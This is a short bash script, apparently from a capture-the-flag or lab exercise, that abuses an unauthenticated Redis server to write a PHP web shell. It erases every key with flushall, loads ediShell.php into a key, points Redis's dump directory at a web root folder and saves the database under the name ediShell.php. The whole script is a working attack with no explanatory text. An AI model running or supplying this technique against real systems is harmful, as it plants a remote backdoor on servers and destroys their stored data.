#!/bin/bash

redis-cli -h 127.0.0.1 flushall
cat ediShell.php | redis-cli -h 127.0.0.1 -x set cracklist
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4
redis-cli -h 127.0.0.1 config set dbfilename "ediShell.php"
redis-cli -h 127.0.0.1 save